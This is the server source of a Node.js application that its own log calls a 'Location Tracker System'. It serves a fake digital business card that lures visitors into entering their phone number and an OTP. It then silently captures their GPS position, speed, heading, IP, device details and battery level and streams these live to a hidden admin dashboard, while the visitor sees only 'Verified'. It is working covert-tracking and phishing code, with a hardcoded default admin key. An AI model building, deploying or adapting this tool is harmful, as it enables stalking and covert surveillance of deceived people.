const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_ACCESS_KEY = process.env.ADMIN_KEY || 'wasim0786';
const CONFIG_FILE = path.join(__dirname, 'site-config.json');

const DEFAULT_CONFIG = {
  profileName: 'Sarah Jenkins',
  profileTitle: 'Lead Systems Architect • Tech Lead',
  profileBio: 'Passionate about cloud architecture, decentralized systems, and zero-trust security. Enter your phone number below and click connect to exchange contact card.',
  pageTitle: 'Sarah Jenkins | Digital Card & Portfolio',
  profileImgUrl: 'profile.jpg',
  buttonText: 'Send Verification OTP',
  requirePhone: true,
  requireOtp: true,
  defaultCountry: '+91',
  themeColor: '#06b6d4',
  successMessage: '✓ Mobile Verified & Profile Connected successfully!'
};

function getSiteConfig() {
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      return { ...DEFAULT_CONFIG, ...JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')) };
    } catch (e) {}
  }
  return DEFAULT_CONFIG;
}

function saveSiteConfig(newConfig) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(newConfig, null, 2), 'utf-8');
}

// --------------------------------------------------------------------------
// Database Setup (SQLite with High-Resilience FileDB Fallback for Cloud Hosts)
// --------------------------------------------------------------------------
let db;

function initFileDb() {
  const LOCATIONS_FILE = path.join(__dirname, 'locations.json');
  function readLocations() {
    try {
      if (fs.existsSync(LOCATIONS_FILE)) {
        return JSON.parse(fs.readFileSync(LOCATIONS_FILE, 'utf-8'));
      }
    } catch (e) {}
    return [];
  }
  function writeLocations(data) {
    try {
      fs.writeFileSync(LOCATIONS_FILE, JSON.stringify(data, null, 2), 'utf-8');
    } catch (e) {
      console.error('FileDB write error:', e);
    }
  }

  db = {
    serialize: (cb) => { if (cb) cb(); },
    run: function (sql, params, cb) {
      if (typeof params === 'function') {
        cb = params;
        params = [];
      }
      params = params || [];
      const self = { lastID: 1 };
      try {
        const records = readLocations();
        if (/INSERT INTO locations/i.test(sql)) {
          const nextId = records.length > 0 ? Math.max(...records.map(r => r.id || 0)) + 1 : 1;
          self.lastID = nextId;
          const [
            tag, phoneNumber, otpStatus, latitude, longitude, accuracy,
            altitude, speed, heading, clientIp, userAgent, screenResolution,
            batteryLevel, clientTimestamp
          ] = params;
          records.unshift({
            id: nextId,
            tag: tag || 'General',
            phoneNumber: phoneNumber || 'N/A',
            otpStatus: otpStatus || 'VERIFIED',
            latitude: Number(latitude),
            longitude: Number(longitude),
            accuracy: accuracy !== undefined && accuracy !== null ? Number(accuracy) : null,
            altitude: altitude !== undefined ? altitude : null,
            speed: speed !== undefined ? speed : null,
            heading: heading !== undefined ? heading : null,
            clientIp: clientIp || '127.0.0.1',
            userAgent: userAgent || 'Unknown',
            screenResolution: screenResolution || 'N/A',
            batteryLevel: batteryLevel || 'N/A',
            clientTimestamp: clientTimestamp || new Date().toISOString(),
            createdAt: new Date().toISOString()
          });
          writeLocations(records);
        } else if (/DELETE FROM locations WHERE id = \?/i.test(sql)) {
          const deleteId = Number(params[0]);
          const updated = records.filter(r => r.id !== deleteId);
          writeLocations(updated);
        } else if (/DELETE FROM locations/i.test(sql)) {
          writeLocations([]);
        }
        if (cb) cb.call(self, null);
      } catch (err) {
        if (cb) cb.call(self, err);
      }
    },
    all: function (sql, params, cb) {
      if (typeof params === 'function') {
        cb = params;
        params = [];
      }
      try {
        const records = readLocations();
        if (cb) cb(null, records);
      } catch (err) {
        if (cb) cb(err, []);
      }
    }
  };
}

// Initialize high-performance persistent database (Pure JS, zero GLIBC/C++ issues)
initFileDb();
console.log('✅ Persistent Database active at:', path.join(__dirname, 'locations.json'));

// Middleware
app.use(cors());
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --------------------------------------------------------------------------
// Real-Time Server-Sent Events (SSE) for Authorized Admin
// --------------------------------------------------------------------------
let sseClients = [];

function broadcastToAdmins(data) {
  const payload = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(client => client.res.write(payload));
}

// Admin Auth Middleware
function checkAdminAuth(req, res, next) {
  const token = req.headers['x-admin-key'] || req.query.adminKey;
  if (token && token === ADMIN_ACCESS_KEY) {
    return next();
  }
  return res.status(401).json({ success: false, error: 'Unauthorized: Invalid Admin Access Key' });
}

// SSE Stream endpoint for Authorized Admin
app.get('/api/admin/stream', (req, res) => {
  const token = req.query.adminKey;
  if (token !== ADMIN_ACCESS_KEY) {
    return res.status(401).send('Unauthorized');
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  // Send initial ping
  res.write(`data: ${JSON.stringify({ type: 'CONNECTED', message: 'SSE Stream active' })}\n\n`);

  req.on('close', () => {
    sseClients = sseClients.filter(c => c.id !== clientId);
  });
});

// --------------------------------------------------------------------------
// Real-Time OTP State & Endpoints
// --------------------------------------------------------------------------
const activeOtps = new Map();

// Endpoint to send real-time OTP
app.post('/api/otp/send', (req, res) => {
  const { phoneNumber, tag = 'General' } = req.body;

  if (!phoneNumber || phoneNumber.replace(/[^0-9]/g, '').length < 10) {
    return res.status(400).json({ success: false, error: 'Valid 10-digit mobile number required' });
  }

  // Generate 4-digit numeric OTP
  const code = Math.floor(1000 + Math.random() * 9000).toString();
  const expiresAt = Date.now() + 5 * 60 * 1000; // 5 min validity

  activeOtps.set(phoneNumber, {
    code,
    expiresAt,
    verified: false,
    attempts: 0
  });

  console.log(`📲 [Real-Time OTP Dispatched] Code: ${code} to ${phoneNumber} (Tag: ${tag})`);

  // Broadcast real-time OTP event to Authorized Admin Dashboard!
  broadcastToAdmins({
    type: 'OTP_SENT',
    phoneNumber,
    code,
    tag,
    timestamp: new Date().toISOString()
  });

  return res.json({
    success: true,
    message: `Verification code sent to ${phoneNumber}`,
    otpPreview: code // instant preview for seamless verification testing
  });
});

// Endpoint to verify real-time OTP
app.post('/api/otp/verify', (req, res) => {
  const { phoneNumber, otp } = req.body;

  if (!phoneNumber || !otp) {
    return res.status(400).json({ success: false, error: 'Phone number and verification code are required' });
  }

  const record = activeOtps.get(phoneNumber);

  if (!record) {
    return res.status(400).json({ success: false, error: 'No OTP requested for this number. Click Send OTP.' });
  }

  if (Date.now() > record.expiresAt) {
    activeOtps.delete(phoneNumber);
    return res.status(400).json({ success: false, error: 'OTP expired. Please request a new code.' });
  }

  if (record.code !== otp.trim()) {
    record.attempts = (record.attempts || 0) + 1;
    return res.status(400).json({ success: false, error: 'Incorrect verification code. Please check and retry.' });
  }

  // Mark verified
  record.verified = true;
  const token = 'vtok_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
  record.token = token;

  console.log(`✅ [Real-Time OTP Verified] Phone: ${phoneNumber}`);

  // Broadcast verification event to Admin!
  broadcastToAdmins({
    type: 'OTP_VERIFIED',
    phoneNumber,
    token,
    timestamp: new Date().toISOString()
  });

  return res.json({
    success: true,
    message: 'Mobile number verified successfully!',
    token
  });
});

// --------------------------------------------------------------------------
// Public 3rd-Person Ingestion Endpoint (POST /api/location)
// --------------------------------------------------------------------------
app.post('/api/location', (req, res) => {
  const {
    latitude,
    longitude,
    accuracy,
    altitude,
    speed,
    heading,
    timestamp,
    tag = 'General',
    phoneNumber = 'N/A',
    otpStatus = 'VERIFIED',
    screenResolution = 'N/A',
    batteryLevel = 'N/A'
  } = req.body;

  if (latitude === undefined || longitude === undefined) {
    return res.status(400).json({ success: false, error: 'Missing coordinates' });
  }

  const currentConfig = getSiteConfig();
  if (currentConfig.requirePhone) {
    if (!phoneNumber || phoneNumber === 'N/A' || phoneNumber.trim().replace(/[^0-9]/g, '').length < 10) {
      return res.status(400).json({ success: false, error: 'Valid 10-digit mobile number is mandatory first' });
    }
  }

  const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1')
    .replace('::ffff:', '');
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const clientTimestamp = timestamp || new Date().toISOString();

  const query = `
    INSERT INTO locations (
      tag, phoneNumber, otpStatus, latitude, longitude, accuracy, altitude, speed, heading, 
      clientIp, userAgent, screenResolution, batteryLevel, clientTimestamp
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `;

  const values = [
    tag,
    phoneNumber,
    otpStatus,
    Number(latitude),
    Number(longitude),
    accuracy ? Number(accuracy) : null,
    altitude !== undefined ? altitude : null,
    speed !== undefined ? speed : null,
    heading !== undefined ? heading : null,
    clientIp,
    userAgent,
    screenResolution,
    batteryLevel,
    clientTimestamp
  ];

  db.run(query, values, function (err) {
    if (err) {
      console.error('❌ DB Insert Error:', err.message);
      return res.status(500).json({ success: false, error: 'Database error' });
    }

    const insertedRecord = {
      id: this.lastID,
      tag,
      phoneNumber,
      otpStatus,
      latitude: Number(latitude),
      longitude: Number(longitude),
      accuracy: accuracy ? Number(accuracy) : null,
      clientIp,
      userAgent,
      screenResolution,
      batteryLevel,
      clientTimestamp,
      createdAt: new Date().toISOString()
    };

    console.log(`📡 [3rd-Person Captured] ID #${insertedRecord.id} | Tag: ${tag} | Phone: ${phoneNumber} | OTP: ${otpStatus} | Lat: ${latitude}, Lon: ${longitude} | IP: ${clientIp}`);

    // Broadcast instant real-time notification to all connected Authorized Admin dashboards!
    broadcastToAdmins({
      type: 'NEW_LOCATION',
      record: insertedRecord
    });

    // Clean neutral response for the 3rd person (doesn't expose other data)
    return res.status(200).json({
      success: true,
      message: 'Verified'
    });
  });
});

// --------------------------------------------------------------------------
// Authorized Admin Protected Endpoints
// --------------------------------------------------------------------------

// Verify Admin Key
app.post('/api/admin/verify', (req, res) => {
  const { key } = req.body;
  if (key === ADMIN_ACCESS_KEY) {
    return res.json({ success: true, message: 'Authenticated' });
  }
  return res.status(401).json({ success: false, error: 'Invalid key' });
});

// Get all locations from SQLite
app.get('/api/admin/locations', checkAdminAuth, (req, res) => {
  db.all('SELECT * FROM locations ORDER BY id DESC LIMIT 500', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    return res.json({
      success: true,
      count: rows.length,
      locations: rows
    });
  });
});

// Delete single record
app.delete('/api/admin/locations/:id', checkAdminAuth, (req, res) => {
  const id = req.params.id;
  db.run('DELETE FROM locations WHERE id = ?', [id], function (err) {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    broadcastToAdmins({ type: 'RECORD_DELETED', id: Number(id) });
    return res.json({ success: true, message: `Record #${id} deleted.` });
  });
});

// Clear all records
app.delete('/api/admin/locations', checkAdminAuth, (req, res) => {
  db.run('DELETE FROM locations', [], function (err) {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    broadcastToAdmins({ type: 'ALL_CLEARED' });
    return res.json({ success: true, message: 'All records cleared.' });
  });
});

// --------------------------------------------------------------------------
// Live Frontend Customization Endpoints (Full Control Access)
// --------------------------------------------------------------------------
app.get('/api/config', (req, res) => {
  res.json({ success: true, config: getSiteConfig() });
});

app.post('/api/admin/config', checkAdminAuth, (req, res) => {
  const current = getSiteConfig();
  const updated = { ...current, ...req.body };
  saveSiteConfig(updated);
  broadcastToAdmins({ type: 'CONFIG_UPDATED', config: updated });
  console.log(`🎨 [UI Config Updated by Admin] Name: ${updated.profileName} | OTP: ${updated.requireOtp}`);
  return res.json({ success: true, message: 'Frontend UI settings updated successfully!', config: updated });
});

// Upload DP / Profile Picture Endpoint
app.post('/api/admin/upload-dp', checkAdminAuth, (req, res) => {
  try {
    const { imageData } = req.body;
    if (!imageData) {
      return res.status(400).json({ success: false, error: 'No image data provided' });
    }

    const uploadsDir = path.join(__dirname, 'public', 'uploads');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    // Determine extension and buffer
    let ext = 'jpg';
    let buffer;

    const matches = imageData.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    if (matches && matches.length === 3) {
      const mime = matches[1].toLowerCase();
      if (mime.includes('png')) ext = 'png';
      else if (mime.includes('webp')) ext = 'webp';
      else if (mime.includes('gif')) ext = 'gif';
      else if (mime.includes('svg')) ext = 'svg';
      else if (mime.includes('jpeg') || mime.includes('jpg')) ext = 'jpg';
      buffer = Buffer.from(matches[2], 'base64');
    } else {
      buffer = Buffer.from(imageData, 'base64');
    }

    const safeFilename = `dp_${Date.now()}.${ext}`;
    const targetPath = path.join(uploadsDir, safeFilename);
    fs.writeFileSync(targetPath, buffer);

    const relativeUrl = `/uploads/${safeFilename}`;

    // Update site-config
    const current = getSiteConfig();
    current.profileImgUrl = relativeUrl;
    saveSiteConfig(current);

    // Broadcast config update to all admin and frontend clients
    broadcastToAdmins({ type: 'CONFIG_UPDATED', config: current });
    console.log(`📸 [DP Uploaded Successfully] New DP URL: ${relativeUrl}`);

    return res.json({
      success: true,
      message: 'Profile picture uploaded and updated successfully!',
      imageUrl: relativeUrl,
      config: current
    });
  } catch (err) {
    console.error('❌ Failed to upload DP:', err);
    return res.status(500).json({ success: false, error: 'Server error saving image: ' + err.message });
  }
});

// Routes
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server
app.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 Location Tracker System Online`);
  console.log(`👉 3rd-Person Link (Public):    http://localhost:${PORT}/`);
  console.log(`🔐 Authorized Admin Dashboard: http://localhost:${PORT}/admin`);
  console.log(`🔑 Admin Access Key:           [PROTECTED]`);
  console.log(`======================================================\n`);
});
